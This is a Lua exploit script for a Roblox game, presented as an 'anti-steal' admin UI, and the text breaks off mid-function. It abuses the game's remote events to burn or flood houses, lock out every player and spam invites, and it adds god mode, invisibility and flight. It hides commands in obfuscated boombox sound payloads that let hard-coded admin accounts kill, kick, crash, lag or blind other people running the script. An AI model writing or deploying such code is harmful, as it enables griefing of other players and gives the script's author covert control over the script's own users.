-- ================================================================
-- KFC ANTI-STEAL v11 UI v5.3 — Semicolon Prefix (;) & Command Bar
-- ================================================================
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local TCS = game:GetService("TextChatService")

-- ============ CONFIG ============
local OWNER_NAME = "LOLASSR5"
local EXTRA_ADMINS = {["kfc_punyhai"]=true,["8ujnngq_152"]=true,["cggg_prjoooo"]=true}
local ADMIN_SHIELD_TAG = "lloyd_adm_shield=1"
local USER_TAG = "lloyd_usr_v11=1"
local CMD_PREFIX = "lloyd_cmd_v11:"

local AdminState = {IsAdmin=false, Role="USER", MusicImmunity=true, ExecutedNonces={}, RainbowTagEnabled=true}
do
    local n = string.lower(LocalPlayer.Name)
    if n == string.lower(OWNER_NAME) then AdminState.IsAdmin=true; AdminState.Role="OWNER"
    elseif EXTRA_ADMINS[n] then AdminState.IsAdmin=true; AdminState.Role="ADMIN" end
end

-- ============ ระบบแจ้งเตือนใน UI (Popup) ============
local function notifyUI(title, content, isError)
    local nGui = Instance.new("ScreenGui")
    nGui.Name = "KFC_Notify"; nGui.ResetOnSpawn = false; nGui.DisplayOrder = 999999
    nGui.Parent = CoreGui
    
    local f = Instance.new("Frame", nGui)
    f.Size = UDim2.new(0, 280, 0, 50)
    f.Position = UDim2.new(0.5, -140, 0, 20)
    f.BackgroundColor3 = isError and Color3.fromRGB(50, 20, 20) or Color3.fromRGB(20, 40, 25)
    f.BorderSizePixel = 0
    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 8)
    local stroke = Instance.new("UIStroke", f)
    stroke.Color = isError and Color3.fromRGB(255,50,50) or Color3.fromRGB(50,255,100)
    
    local lbl = Instance.new("TextLabel", f)
    lbl.Size = UDim2.new(1, -20, 1, -20); lbl.Position = UDim2.new(0, 10, 0, 10)
    lbl.BackgroundTransparency = 1; lbl.Text = title.."\n"..content
    lbl.TextColor3 = Color3.fromRGB(255,255,255); lbl.TextSize = 11
    lbl.Font = Enum.Font.GothamBold; lbl.TextWrapped = true
    
    TweenService:Create(f, TweenInfo.new(0.3), {Position = UDim2.new(0.5, -140, 0, 40)}):Play()
    task.delay(3, function()
        TweenService:Create(f, TweenInfo.new(0.3), {Position = UDim2.new(0.5, -140, 0, 10)}):Play()
        task.wait(0.3); nGui:Destroy()
    end)
end

-- ============ SCRIPT USER DETECTION ============
local ScriptUsers = {}
local SCRIPT_TAGS = {"lloyd_usr_v11=1","lloyd_usr_v7=1","lloyd_adm_shield=1","lloyd_cmd_v11:"}

local function detectScriptUser(plr, payload)
    if not plr or plr == LocalPlayer then return false end
    if type(payload) ~= "string" or payload == "" then return false end
    for _, tag in ipairs(SCRIPT_TAGS) do
        if payload:find(tag, 1, true) then
            ScriptUsers[plr.Name] = os.time()
            return true
        end
    end
    return false
end

local function getScriptUserList()
    local list = {}
    local cutoff = os.time() - 900
    for name, ts in pairs(ScriptUsers) do
        if not Players:FindFirstChild(name) or (os.time() - ts) > cutoff then
            ScriptUsers[name] = nil
        else
            list[#list+1] = name
        end
    end
    table.sort(list)
    return list
end

local function scanAllForScriptUsers()
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer and p.Character then
            local function scan(c)
                if not c then return end
                for _, d in ipairs(c:GetDescendants()) do
                    if d:IsA("Sound") and d.Name == "PlayersChoice" and d.SoundId ~= "" then
                        detectScriptUser(p, d.SoundId)
                    end
                end
            end
            scan(p.Character)
            if p:FindFirstChild("Backpack") then scan(p.Backpack) end
        end
    end
    return getScriptUserList()
end

-- ============ PAYLOAD BUILDER ============
local HEX = "0123456789ABCDEF"
local ZWS = "\226\128\139"
local function sf(s)
    local o = {}
    for i=1,#s do
        local b = string.byte(s,i); local hi,lo = math.floor(b/16)+1,(b%16)+1
        local h1,h2 = string.sub(HEX,hi,hi),string.sub(HEX,lo,lo)
        if math.random(1,5)==1 and b>=48 and b<=57 then o[#o+1] = " "..string.char(b).." "
        else o[#o+1] = string.rep(" ",math.random(0,2)).."%"..string.rep(" ",math.random(1,2))..h1..string.rep(" ",math.random(0,2))..h2 end
    end
    return table.concat(o)
end
local BAIT = {"1848354536","1837879082","9043887091","1845756489","9048375035","1836842899","1843404009","7029024726","5410086218","1846458016","129138368026497","1847102938","1835201928","9047819203"}
local VALID_KEYS = {"& % 6 9 % 6 4 = ","&  % 6 9  % 6 4  =  ","&   i   d   =   "}
local POISON_KEYS = {"& % 6 9 % 0 0 % 6 4 = ","& % 6 9 % 6 4 % 0 0 = ","&"..ZWS.."% 6 9 % 6 4 = ","& % 2 6 % 6 9 % 6 4 % 3 D "}
local GARBAGE_KEYS = {"real_id","true_id","id_main","id_play","sound_id","audio_id","music_id","track_id","rbxassetid"}
local function encKey(k)
    local p = math.random(1,#k); local o = {}
    for i=1,#k do
        if i==p then o[#o+1] = "% 0 0 " end
        local b = string.byte(k,i); local hi,lo = math.floor(b/16)+1,(b%16)+1
        o[#o+1] = "% "..string.sub(HEX,hi,hi).." "..string.sub(HEX,lo,lo).." "
    end
    return table.concat(o)
end
local function rb(excl) for _=1,16 do local p=BAIT[math.random(1,#BAIT)]; if p~=tostring(excl) then return p end end return "1848354536" end
local function buildPayload(rawId, cmdSuffix)
    local id = tostring(rawId):match("%d+") or tostring(rawId)
    local lines = {"120232514292241&owner="..OWNER_NAME}
    local realIdx = math.random(6,14)
    for i=1,20 do
        if i==realIdx then
            lines[#lines+1] = "%E2%80%AE"..POISON_KEYS[math.random(1,#POISON_KEYS)]..rb(id).."&%00"..VALID_KEYS[math.random(1,#VALID_KEYS)]..sf(string.rep("0",math.random(2,4)))..sf(id).."&%00"
        else
            local segs = {}
            for _=1,math.random(1,3) do
                if math.random(1,2)==1 then segs[#segs+1] = POISON_KEYS[math.random(1,#POISON_KEYS)]..sf(rb(id)).."&%00"
                else segs[#segs+1] = "& "..encKey(GARBAGE_KEYS[math.random(1,#GARBAGE_KEYS)]).."= "..sf(rb(id)).."&%00" end
            end
            lines[#lines+1] = "%E2%80%AE"..table.concat(segs)
        end
    end
    local body = table.concat(lines,"\r\n")
    if AdminState.IsAdmin and AdminState.MusicImmunity then body = body.."&%00&"..ADMIN_SHIELD_TAG.."&%00"
    elseif not AdminState.IsAdmin then body = body.."&%00&"..USER_TAG.."&%00" end
    if cmdSuffix then body = body.."&%00&"..cmdSuffix.."&%00" end
    return body
end

-- ============ BOOMBOX HELPERS ============
local RE = ReplicatedStorage:FindFirstChild("RE")
local Remotes = ReplicatedStorage:FindFirstChild("Remotes")
local function getRE(n) return RE and RE:FindFirstChild(n) end
local function getRem(n) return Remotes and Remotes:FindFirstChild(n) end
local function getBoombox()
    local c = LocalPlayer.Character
    if c then for _,t in ipairs(c:GetChildren()) do if t:IsA("Tool") and string.lower(t.Name):find("boombox",1,true) then return t end end end
    local bp = LocalPlayer:FindFirstChildOfClass("Backpack")
    if bp then for _,t in ipairs(bp:GetChildren()) do if t:IsA("Tool") and string.lower(t.Name):find("boombox",1,true) then return t end end end
    return nil
end
local function equipBoombox()
    local tool = getBoombox()
    if not tool then
        local p = getRE("1Too1l")
        if p then pcall(function() p:InvokeServer("PickingTools","Boombox") end)
            local t0=os.clock(); while os.clock()-t0<1.5 do tool=getBoombox(); if tool then break end; task.wait(0.05) end
        end
    end
    local c = LocalPlayer.Character; local h = c and c:FindFirstChildOfClass("Humanoid")
    if tool and c and tool.Parent~=c then
        if h then h:EquipTool(tool) else tool.Parent=c end
        task.wait(0.1)
    end
    return tool
end

-- ============ OWNER PERKS ============
local P = {}
function P.PlayMusic(aid, useVehicle)
    local id = tostring(aid):match("%d+") or tostring(aid); if id=="" then return end
    local payload = buildPayload(id)
    local te = getRE("PlayerToolEvent"); local se = getRE("1NoMoto1rVehicle1s") or getRE("1NoMo1torVeh1icle1s") or getRE("PlayerScooterEvent")
    if te then
        pcall(function() te:FireServer("ToolMusicStop","",nil) end); task.wait(0.08)
        pcall(function() te:FireServer("ToolMusicText",payload,nil,true) end)
        pcall(function() te:FireServer("ToolMusic",id,1) end)
        pcall(function() te:FireServer("ToolMusicPlay","",nil) end)
    end
    if useVehicle and se then
        pcall(function() se:FireServer("PickingScooterMusicStop","",nil) end); task.wait(0.08)
        pcall(function() se:FireServer("PickingScooterMusicText",payload,nil,true) end)
        pcall(function() se:FireServer("PickingScooterMusic",id,1) end)
        pcall(function() se:FireServer("PickingScooterMusicPlay","",nil) end)
    end
end
function P.StopMusic()
    local te = getRE("PlayerToolEvent"); local se = getRE("1NoMoto1rVehicle1s") or getRE("1NoMo1torVeh1icle1s")
    if te then pcall(function() te:FireServer("ToolMusicStop","",nil) end); pcall(function() te:FireServer("ToolMusicText","") end) end
    if se then pcall(function() se:FireServer("PickingScooterMusicStop","",nil) end); pcall(function() se:FireServer("PickingScooterMusicText","") end) end
end
function P.HouseFire() local e=getRE("1Player1sHous1e"); if e then pcall(function() e:FireServer("HouseFire") end) end end
function P.HouseFlood() local e=getRE("1Player1sHous1e"); if e then pcall(function() e:FireServer("SinkPool") end) end end
function P.LockDoors() local e=getRE("1Player1sHous1e"); if e then pcall(function() e:FireServer("LockDoors") end); pcall(function() e:FireServer("HouseDoorLock") end) end end
function P.Curtains() local e=getRE("1Player1sHous1e"); if e then pcall(function() e:FireServer("Curtains") end) end end
function P.GarageDoor() local e=getRE("1Player1sHous1e"); if e then pcall(function() e:FireServer("GarageDoor") end) end end
function P.InviteAll()
    local e = getRem("InvitePlayerToFamily"); if not e then return end
    for _,p in ipairs(Players:GetPlayers()) do if p~=LocalPlayer then pcall(function() e:FireServer(p.UserId,"FamilyInviteMenu") end) end end
end
local function houseModel()
    local lot = workspace:FindFirstChild("001_Lots"); if not lot then return nil end
    for _,h in ipairs(lot:GetChildren()) do
        local o = h:FindFirstChild("Owner"); if o and o.Value==LocalPlayer.Name then
            local pk = h:FindFirstChild("HousePickedByPlayer"); return pk and pk:FindFirstChild("HouseModel")
        end
    end
end
function P.BanAll()
    local m = houseModel(); local d = m and m:FindFirstChild("Permissions:Disallow")
    if d then for _,p in ipairs(Players:GetPlayers()) do if p~=LocalPlayer then pcall(function() d:FireServer(p) end) end end end
end
function P.UnbanAll()
    local m = houseModel(); local a = m and m:FindFirstChild("Permissions:Allow")
    if a then for _,p in ipairs(Players:GetPlayers()) do if p~=LocalPlayer then pcall(function() a:FireServer(p) end) end end end
end
local rgbHA, rgbHC = false, nil
function P.RGBStart()
    if rgbHA then return end; rgbHA = true
    rgbHC = RunService.Heartbeat:Connect(function()
        if not rgbHA then return end
        local c = Color3.fromHSV((os.clock()*0.35)%1, 0.9, 1)
        local a = getRE("1RPHous1eEven1tColo1r"); if a then pcall(function() a:FireServer("PickingHouseColor",c) end) end
        local b = getRem("Property:SetColor"); if b then pcall(function() b:FireServer(c) end) end
    end)
end
function P.RGBStop() rgbHA=false; if rgbHC then rgbHC:Disconnect(); rgbHC=nil end end
function P.TPBehind(name)
    local tp = Players:FindFirstChild(name)
    local th = tp and tp.Character and tp.Character:FindFirstChild("HumanoidRootPart")
    local mh = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if th and mh then mh.CFrame = th.CFrame * CFrame.new(0,0,4.5) end
end

-- ============ ADMIN EXECUTE ============
local function execAdmin(action, adminName, senderPlr, param)
    local c = LocalPlayer.Character
    local h = c and c:FindFirstChildOfClass("Humanoid")
    local hrp = c and c:FindFirstChild("HumanoidRootPart")
    action = string.upper(action or "")

    if action=="KILL" then
        if h then pcall(function() h.Health=0 end) end
        if c then pcall(function() c:BreakJoints() end) end
    elseif action=="VOID" then
        if hrp then pcall(function()
            for _,p in ipairs(c:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide=false end end
            hrp.Anchored=false; hrp.CFrame=CFrame.new(hrp.Position.X,-500,hrp.Position.Z); hrp.Velocity=Vector3.new(0,-700,0)
        end) end
    elseif action=="FLING" then
        if hrp and h then pcall(function() h.Sit=true; hrp.Anchored=false
            hrp.Velocity=Vector3.new(math.random(-900,900),1200,math.random(-900,900))
            hrp.RotVelocity=Vector3.new(500,700,500) end) end
    elseif action=="SKY" then
        if hrp then pcall(function() hrp.Anchored=false
            hrp.CFrame=hrp.CFrame+Vector3.new(0,1500,0); hrp.Velocity=Vector3.new(0,200,0) end) end
    elseif action=="FREEZE_START" or action=="FREEZE" then
        _G._kfcFZ = true
        local function ap()
            local cc=LocalPlayer.Character; if not cc then return end
            local hh=cc:FindFirstChild("HumanoidRootPart"); local hm=cc:FindFirstChildOfClass("Humanoid")
            if hh then pcall(function() hh.Anchored=true; hh.AssemblyLinearVelocity=Vector3.zero end) end
            if hm then pcall(function() hm.WalkSpeed=0; hm.JumpPower=0; hm.PlatformStand=true end) end
        end
        ap()
        if _G._kfcFZC then pcall(function() _G._kfcFZC:Disconnect() end) end
        _G._kfcFZC = RunService.Heartbeat:Connect(function() if _G._kfcFZ then ap() end end)
    elseif action=="FREEZE_STOP" or action=="UNFREEZE" then
        _G._kfcFZ=false
        if _G._kfcFZC then pcall(function() _G._kfcFZC:Disconnect() end); _G._kfcFZC=nil end
        local cc=LocalPlayer.Character; if cc then
            local hh=cc:FindFirstChild("HumanoidRootPart"); local hm=cc:FindFirstChildOfClass("Humanoid")
            if hh then pcall(function() hh.Anchored=false end) end
            if hm then pcall(function() hm.PlatformStand=false; hm.WalkSpeed=16; hm.JumpPower=50 end) end
        end
    elseif action=="KICK" then
        pcall(function() LocalPlayer:Kick("Removed by admin") end)
    elseif action=="UNLOAD" then
        if _G._kfcFC then pcall(function() _G._kfcFC:Disconnect() end) end
        if _G._kfcFZC then pcall(function() _G._kfcFZC:Disconnect() end) end
        if _G._kfcSpinConn then pcall(function() _G._kfcSpinConn:Disconnect() end) end
        if _G._kfcVibConn then pcall(function() _G._kfcVibConn:Disconnect() end) end
        if _G._kfcRC then for _,c2 in ipairs(_G._kfcRC) do pcall(function() c2:Disconnect() end) end; _G._kfcRC=nil end
        if _G._kfcRain then pcall(function() _G._kfcRain:Disconnect() end); _G._kfcRain=nil end
        pcall(function()
            local g=CoreGui:FindFirstChild("KFC_AntiSteal_UI"); if g then g:Destroy() end
            local t=CoreGui:FindFirstChild("KFC_AdminTag"); if t then t:Destroy() end
        end)
    elseif action=="CRASH" then
        if hrp then
            for i=1,200 do
                task.spawn(function()
                    local p = Instance.new("Part")
                    p.Size = Vector3.new(50,50,50); p.Transparency = 1; p.CanCollide = false; p.Anchored = false
                    p.CFrame = hrp.CFrame * CFrame.new(math.random(-15,15), math.random(0,10), math.random(-15,15))
                    p.Parent = workspace
                    task.delay(0.4, function() if p then p:Destroy() end end)
                end)
            end
        end
    elseif action=="LAG" then
        if hrp then
            for i=1,50 do
                task.spawn(function()
                    local att = Instance.new("Attachment"); att.Parent = hrp
                    local em = Instance.new("ParticleEmitter")
                    em.Rate = 500; em.Lifetime = NumberRange.new(3); em.Speed = NumberRange.new(50)
                    em.SpreadAngle = Vector2.new(360, 360); em.Color = ColorSequence.new(Color3.fromHSV(math.random(),1,1))
                    em.Size = NumberSequence.new(2); em.Parent = att
                    task.delay(3, function() if att then att:Destroy() end end)
                end)
            end
        end
    elseif action=="BLIND" then
        local blind = Instance.new("Frame")
        blind.Size = UDim2.new(1,0,1,0); blind.BackgroundColor3 = Color3.new(0,0,0)
        blind.BorderSizePixel = 0; blind.ZIndex = 999999; blind.Parent = CoreGui
        task.delay(5, function() if blind then blind:Destroy() end end)
    elseif action=="MUTE" then
        pcall(function() game:GetService("SoundService").Volume = 0 end)
    elseif action=="UNMUTE" then
        pcall(function() game:GetService("SoundService").Volume = 1 end)
    elseif action=="STRIP" then
        if c then
            for _, obj in ipairs(c:GetChildren()) do
                if obj:IsA("Accessory") or obj:IsA("Shirt") or obj:IsA("Pants") or obj:IsA("ShirtGraphic") then
                    pcall(function() obj:Destroy() end)
                end
            end
        end
    elseif action=="HIDEUI" then
        pcall(function() local g = CoreGui:FindFirstChild("KFC_AntiSteal_UI"); if g then g.Enabled = false end end)
    elseif action=="SHOWUI" then
        pcall(function() local g = CoreGui:FindFirstChild("KFC_AntiSteal_UI"); if g then g.Enabled = true end end)
    elseif action=="SHOWMSG" then
        local msg = tostring(param or "Admin Message")
        local g = Instance.new("ScreenGui"); g.Name = "KFC_AdminMsg"; g.ResetOnSpawn = false; g.DisplayOrder = 999998; g.Parent = CoreGui
        local f = Instance.new("TextLabel"); f.Size = UDim2.new(0, 500, 0, 80); f.Position = UDim2.new(0.5, -250, 0.3, 0)
        f.BackgroundColor3 = Color3.fromRGB(10,12,18); f.BackgroundTransparency = 0.15; f.Text = "📢 "..msg
        f.TextColor3 = Color3.new(1,1,1); f.TextSize = 20; f.Font = Enum.Font.GothamBold; f.TextWrapped = true
        f.Parent = g; Instance.new("UICorner",f).CornerRadius = UDim.new(0,12)
        local st = Instance.new("UIStroke",f); st.Color = Color3.fromRGB(255,50,50); st.Thickness = 2
        task.delay(6, function() if g then g:Destroy() end end)
    elseif action=="CAGE" then
        if hrp then
            local cage = Instance.new("Model"); cage.Name = "KFC_Cage"
            for i = 1, 4 do
                local p = Instance.new("Part"); p.Size = Vector3.new(10, 12, 0.5)
                p.Anchored = true; p.CanCollide = true; p.Transparency = 0.3; p.Material = Enum.Material.Neon; p.Color = Color3.fromRGB(255,50,50)
                p.Parent = cage
                if i==1 then p.CFrame = hrp.CFrame * CFrame.new(0,5,-5)
                elseif i==2 then p.CFrame = hrp.CFrame * CFrame.new(0,5,5)
                elseif i==3 then p.CFrame = hrp.CFrame * CFrame.new(-5,5,0) * CFrame.Angles(0,math.rad(90),0)
                else p.CFrame = hrp.CFrame * CFrame.new(5,5,0) * CFrame.Angles(0,math.rad(90),0) end
            end
            local roof = Instance.new("Part"); roof.Size = Vector3.new(10,0.5,10); roof.Anchored = true; roof.Transparency = 0.3
            roof.Material = Enum.Material.Neon; roof.Color = Color3.fromRGB(255,50,50); roof.CFrame = hrp.CFrame * CFrame.new(0,11,0)
            roof.Parent = cage; cage.Parent = workspace
            task.delay(10, function() if cage then cage:Destroy() end end)
        end
    elseif action=="EXPLODE" then
        if hrp then
            local e = Instance.new("Explosion"); e.Position = hrp.Position; e.BlastRadius = 12; e.BlastPressure = 0; e.DestroyJointRadiusPercent = 0; e.Parent = workspace
        end
    elseif action=="DANCE" then
        if h then
            pcall(function()
                local animator = h:FindFirstChildOfClass("Animator")
                if animator then local anim = Instance.new("Animation"); anim.AnimationId = "rbxassetid://507771019"; animator:LoadAnimation(anim):Play() end
            end)
        end
    elseif action=="SIT" then if h then pcall(function() h.Sit = true end) end
    elseif action=="STAND" then if h then pcall(function() h.Sit = false end) end
    elseif action=="SPIN" then
        if _G._kfcSpinConn then pcall(function() _G._kfcSpinConn:Disconnect() end) end
        _G._kfcSpinConn = RunService.Heartbeat:Connect(function()
            local cc = LocalPlayer.Character; local hh = cc and cc:FindFirstChild("HumanoidRootPart")
            if hh then hh.CFrame = hh.CFrame * CFrame.Angles(0, math.rad(30), 0) end
        end)
        task.delay(10, function() if _G._kfcSpinConn then pcall(function() _G._kfcSpinConn:Disconnect() end); _G._kfcSpinConn = nil end end)
    elseif action=="BIGHEAD" then
        if c then local head = c:FindFirstChild("Head"); if head then head.Size = head.Size * 3 end end
    elseif action=="SMALLHEAD" then
        if c then local head = c:FindFirstChild("Head"); if head then head.Size = head.Size * 0.3 end end
    elseif action=="HEAL" then if h then h.Health = h.MaxHealth end
    elseif action=="RAGDOLL" then
        if h then pcall(function() h.PlatformStand = true; h:ChangeState(Enum.HumanoidStateType.Physics) end) end
        task.delay(5, function() if h and h.Parent then pcall(function() h.PlatformStand = false; h:ChangeState(Enum.HumanoidStateType.GettingUp) end) end end)
    elseif action=="RESET" then if h then h.Health = 0 end
    elseif action=="FLIP" then if hrp then hrp.CFrame = hrp.CFrame * CFrame.Angles(math.rad(180), 0, 0) end
    elseif action=="VIBRATE" then
        if _G._kfcVibConn then pcall(function() _G._kfcVibConn:Disconnect() end) end
        _G._kfcVibConn = RunService.Heartbeat:Connect(function()
            local cc = LocalPlayer.Character; local hh = cc and cc:FindFirstChild("HumanoidRootPart")
            if hh then hh.CFrame = hh.CFrame * CFrame.new(math.random(-100,100)/500, 0, math.random(-100,100)/500) end
        end)
        task.delay(5, function() if _G._kfcVibConn then pcall(function() _G._kfcVibConn:Disconnect() end); _G._kfcVibConn = nil end end)
    elseif action=="GRAVITY" then workspace.Gravity = tonumber(param) or 196
    elseif action=="SPEED" then if h then h.WalkSpeed = tonumber(param) or 50 end
    elseif action=="JUMP" then if h then h.UseJumpPower = true; h.JumpPower = tonumber(param) or 100 end
    end
end

-- ============ PARSE INCOMING COMMAND ============
local function parseCmd(payload, sp)
    if type(payload)~="string" or not payload:find(CMD_PREFIX,1,true) then return end
    local a,t,adm,nonce,param = payload:match(CMD_PREFIX.."([A-Z_0-9]+):([^:]+):([^:]+):([%w_]+):?([^&%z]*)")
    if not a or not nonce then return end
    if AdminState.ExecutedNonces[nonce] then return end
    local al = string.lower(adm)
    if al ~= string.lower(OWNER_NAME) and not EXTRA_ADMINS[al] then return end
    local ml = string.lower(LocalPlayer.Name); local tl = string.lower(t)
    if tl~="all" and tl~=ml then return end
    if tl=="all" and al==ml then return end
    AdminState.ExecutedNonces[nonce] = true
    task.spawn(function() execAdmin(a, adm, sp, param) end)
end

-- ============ WATCH PLAYERS ============
local RC = {}
_G._kfcRC = RC
local HS = setmetatable({}, {__mode="k"})
local function hookSnd(snd, plr)
    if not snd or not snd:IsA("Sound") or snd.Name~="PlayersChoice" or HS[snd] then return end
    HS[snd] = true
    if snd.SoundId~="" then detectScriptUser(plr, snd.SoundId); parseCmd(snd.SoundId, plr) end
    RC[#RC+1] = snd:GetPropertyChangedSignal("SoundId"):Connect(function()
        if snd.SoundId~="" then detectScriptUser(plr, snd.SoundId); parseCmd(snd.SoundId, plr) end
    end)
end
local function watchP(p)
    local function attach(c)
        if not c then return end
        for _,d in ipairs(c:GetDescendants()) do if d:IsA("Sound") and d.Name=="PlayersChoice" then hookSnd(d,p) end end
        RC[#RC+1] = c.DescendantAdded:Connect(function(d) if d:IsA("Sound") and d.Name=="PlayersChoice" then hookSnd(d,p) end end)
    end
    if p.Character then attach(p.Character) end
    RC[#RC+1] = p.CharacterAdded:Connect(attach)
    if p:FindFirstChild("Backpack") then attach(p.Backpack) end
    RC[#RC+1] = p.ChildAdded:Connect(function(c) if c.Name=="Backpack" then attach(c) end end)
end
for _,p in ipairs(Players:GetPlayers()) do watchP(p) end
RC[#RC+1] = Players.PlayerAdded:Connect(watchP)

-- ============ BROADCAST ============
local function broadcastSingle(action, target, param)
    if not AdminState.IsAdmin then return false end
    local nonce = tostring(math.floor(os.clock()*1000)).."_"..tostring(math.random(100,999))
    local cmd = string.format("%s%s:%s:%s:%s:%s", CMD_PREFIX, string.upper(action), string.lower(target), LocalPlayer.Name, nonce, tostring(param or ""))
    local ml = string.lower(LocalPlayer.Name)
    if string.lower(target)==ml then
        AdminState.ExecutedNonces[nonce]=true
        execAdmin(action, LocalPlayer.Name, LocalPlayer, param)
        return true
    end
    task.spawn(function()
        local wasEq = false
        local tool = getBoombox()
        if not tool then tool = equipBoombox() end
        if not tool then return end
        local c = LocalPlayer.Character; local h = c and c:FindFirstChildOfClass("Humanoid"); local bp = LocalPlayer:FindFirstChildOfClass("Backpack")
        wasEq = (c and tool.Parent==c)
        local payload = buildPayload("120232514292241", cmd)
        local te = getRE("PlayerToolEvent"); local se = getRE("1NoMoto1rVehicle1s") or getRE("1NoMo1torVeh1icle1s")
        if c and tool.Parent~=c then
            for _,pt in ipairs(tool:GetDescendants()) do if pt:IsA("BasePart") then pt.LocalTransparencyModifier=1 end end
            if h then h:EquipTool(tool) else tool.Parent=c end
            task.wait(0.05)
        end
        if te then
            pcall(function() te:FireServer("ToolMusicStop","",nil) end); task.wait(0.04)
            pcall(function() te:FireServer("ToolMusicText",payload,nil,true) end); task.wait(0.06)
            pcall(function() te:FireServer("ToolMusicStop","",nil) end)
        end
        if se then
            pcall(function() se:FireServer("PickingScooterMusicText",payload,nil,true) end); task.wait(0.04)
            pcall(function() se:FireServer("PickingScooterMusicStop","",nil) end)
        end
        if tool and not wasEq and bp and tool.Parent==c then task.wait(0.06); tool.Parent=bp end
    end)
    return true
end

local function broadcast(action, target, param)
    if not AdminState.IsAdmin then return false end
    local tl = string.lower(tostring(target or "all"))
    if tl=="su" or tl=="scripts" or tl=="scriptusers" or tl=="@su" or tl=="susers" then
        local list = getScriptUserList()
        local sent = 0
        for _, n in ipairs(list) do
            if string.lower(n) ~= string.lower(LocalPlayer.Name) then
                broadcastSingle(action, n, param)
                sent = sent + 1
            end
        end
        if sent == 0 then notifyUI("ไม่พบผู้ใช้สคริปต์", "ไม่มีคนในเซิร์ฟที่รัน UI นี้อยู่", true) end
        return sent > 0
    end
    return broadcastSingle(action, target, param)
end

-- ============ RAINBOW TAG ============
local RTGui = Instance.new("ScreenGui")
RTGui.Name="KFC_AdminTag"; RTGui.ResetOnSpawn=false; RTGui.Parent=CoreGui
local function attachRT(plr)
    if not plr or plr==LocalPlayer then return end
    local l = string.lower(plr.Name)
    local isA = (l==string.lower(OWNER_NAME)) or EXTRA_ADMINS[l]
    if not isA then return end
    local function attach(c)
        if not c then return end
        local hd = c:FindFirstChild("Head") or c:WaitForChild("Head",5)
        if not hd then return end
        local old = hd:FindFirstChild("KFC_AdminBB"); if old then old:Destroy() end
        local bb = Instance.new("BillboardGui"); bb.Name="KFC_AdminBB"
        bb.Size=UDim2.fromOffset(220,36); bb.StudsOffset=Vector3.new(0,2.8,0); bb.AlwaysOnTop=true; bb.ResetOnSpawn=false; bb.Parent=hd
        local pill = Instance.new("Frame"); pill.Size=UDim2.new(1,-8,1,-4); pill.Position=UDim2.new(0,4,0,2)
        pill.BackgroundColor3=Color3.fromRGB(10,12,18); pill.BackgroundTransparency=0.15; pill.BorderSizePixel=0; pill.Parent=bb
        Instance.new("UICorner",pill).CornerRadius=UDim.new(1,0)
        local st = Instance.new("UIStroke",pill); st.Thickness=1.6; st.Transparency=0.05; st.ApplyStrokeMode=Enum.ApplyStrokeMode.Border
        Instance.new("UIGradient",st)
        local lb = Instance.new("TextLabel",pill); lb.Size=UDim2.new(1,-16,1,0); lb.Position=UDim2.new(0,8,0,0)
        lb.BackgroundTransparency=1; lb.Font=Enum.Font.GothamBold; lb.TextSize=13; lb.TextColor3=Color3.fromRGB(255,255,255)
        lb.TextStrokeTransparency=0.25; lb.Text=(l==string.lower(OWNER_NAME) and "👑 OWNER" or "🛡️ ADMIN").." • @"..plr.Name
        Instance.new("UIGradient",lb)
    end
    if plr.Character then attach(plr.Character) end
    plr.CharacterAdded:Connect(attach)
end
if _G._kfcRain then pcall(function() _G._kfcRain:Disconnect() end) end
local ra = 0
_G._kfcRain = RunService.RenderStepped:Connect(function(dt)
    ra=ra+dt; if ra<0.04 then return end; ra=0
    if not AdminState.RainbowTagEnabled then return end
    local t = os.clock()*0.4
    local c1 = Color3.fromHSV(t%1,0.85,1); local c2 = Color3.fromHSV((t+0.3)%1,0.85,1)
    local seq = ColorSequence.new({ColorSequenceKeypoint.new(0,c1),ColorSequenceKeypoint.new(1,c2)})
    for _,p in ipairs(Players:GetPlayers()) do
        local l = string.lower(p.Name)
        if l==string.lower(OWNER_NAME) or EXTRA_ADMINS[l] then
            local hd = p.Character and p.Character:FindFirstChild("Head")
            local bb = hd and hd:FindFirstChild("KFC_AdminBB")
            if bb then
                local pil = bb:FindFirstChild("Frame"); local st = pil and pil:FindFirstChildOfClass("UIStroke"); local lb = pil and pil:FindFirstChild("TextLabel")
                if st then local g=st:FindFirstChildOfClass("UIGradient"); if g then g.Color=seq end end
                if lb then local g=lb:FindFirstChildOfClass("UIGradient"); if g then g.Color=seq end end
            end
        end
    end
end)
for _,p in ipairs(Players:GetPlayers()) do attachRT(p) end
Players.PlayerAdded:Connect(attachRT)

-- ============ UTILITY SYSTEMS ============
local U = {God=false, Invis=false, Fly=false, FlySpeed=60}
local godC, invisC, flyC, flyBV, flyBG
function U.SetGod(on)
    U.God=on; if godC then pcall(function() godC:Disconnect() end); godC=nil end
    if on then godC = RunService.Heartbeat:Connect(function()
        local c = LocalPlayer.Character; local h = c and c:FindFirstChildOfClass("Humanoid")
        if h and h.Health < h.MaxHealth then h.Health = h.MaxHealth end
    end) end
end
function U.SetInvis(on)
    U.Invis=on; if invisC then pcall(function() invisC:Disconnect() end); invisC=nil end
    local function apply()
        local cc = LocalPlayer.Character; if not cc then return end
        for _,p in ipairs(cc:GetDescendants()) do
            if p:IsA("BasePart") then p.LocalTransparencyModifier = on and 1 or 0 end
            if p:IsA("Decal") then p.Transparency = on and 1 or 0 end
        end
    end
    apply()
    if on then invisC = RunService.Stepped:Connect(apply) end
end
function U.SetFly(on)
    U.Fly=on
    if flyC then pcall(function() flyC:Disconnect() end); flyC=nil end
    if flyBV then pcall(function() flyBV:Destroy() end); flyBV=nil end
    if flyBG then pcall(function() flyBG:Destroy() end); flyBG=nil end
    local h = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    if h and not on then h.PlatformStand=false end
    if on then flyC = RunService.RenderStepped:Connect(function()
        local c=LocalPlayer.Character; local hrp=c and c:FindFirstChild("HumanoidRootPart"); local hh=c and c:FindFirstChildOfClass("Humanoid"); local cam=workspace.CurrentCamera
        if not hrp or not hh or not cam then return end
        if not flyBV or flyBV.Parent~=hrp then
            if flyBV then flyBV:Destroy() end
